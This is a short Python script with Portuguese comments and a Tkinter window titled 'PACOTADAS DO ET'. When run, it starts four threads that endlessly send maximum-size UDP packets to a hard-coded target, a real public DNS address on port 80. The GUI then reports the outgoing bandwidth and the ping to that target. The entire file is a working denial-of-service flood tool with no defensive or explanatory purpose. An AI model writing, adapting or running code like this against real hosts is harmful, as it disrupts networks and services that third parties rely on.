import tkinter as tk
import threading
import psutil
import time
import subprocess
import socket
import sys

# === CONFIGURAÇÕES ===
TARGET_IP     = "8.8.8.8"
TARGET_PORT   = 80
BUFFER_SIZE   = 65507
FLOOD_THREADS = 4
IFACE_NAME    = "Ethernet"

# === FLOOD EM THREADS ===
def flood_packets():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b'A' * BUFFER_SIZE
        while True:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
    except Exception as e:
        print("Flood error:", e, file=sys.stderr)

for _ in range(FLOOD_THREADS):
    t = threading.Thread(target=flood_packets, daemon=True)
    t.start()

# === FUNÇÕES DE MONITORAMENTO ===
prev_sent = None
def update_status():
    global prev_sent
    try:
        stats = psutil.net_io_counters(pernic=True)
        iface = stats.get(IFACE_NAME)
        if iface is None:
            status_var.set(f"Interface '{IFACE_NAME}' não encontrada")
        else:
            now_sent = iface.bytes_sent
            if prev_sent is None:
                prev_sent = now_sent
                rate = 0.0
            else:
                delta = now_sent - prev_sent
                rate = (delta * 8) / 1_000_000  # Mbps
                prev_sent = now_sent

            # ping
            ping = "Err"
            try:
                out = subprocess.run(["ping", "-n", "1", TARGET_IP],
                                     capture_output=True, text=True, timeout=2).stdout
                for line in out.splitlines():
                    if "tempo=" in line or "time=" in line:
                        ping = (line.split("tempo=")[-1] if "tempo=" in line else line.split("time=")[-1]).split()[0]
                        break
            except Exception:
                ping = "Err"

            status_var.set(f"TX: {rate:.1f} Mbps    Ping: {ping}")
    except Exception as ex:
        status_var.set(f"Erro: {ex}")
        print("Update error:", ex, file=sys.stderr)

    # agenda próxima atualização em 1000ms
    root.after(1000, update_status)

# === GUI ===
root = tk.Tk()
root.title("PACOTADAS DO ET")
root.geometry("400x150")
root.resizable(False, False)
root.configure(bg="black")

tk.Label(root, text="PACOTADAS DO ET",
         font=("Helvetica", 24, "bold"),
         fg="lime", bg="black")\
  .pack(pady=10)

status_var = tk.StringVar(value="Iniciando…")
tk.Label(root, textvariable=status_var,
         font=("Consolas", 16), fg="white", bg="black")\
  .pack()

# inicia loop de atualização
root.after(100, update_status)
root.mainloop()
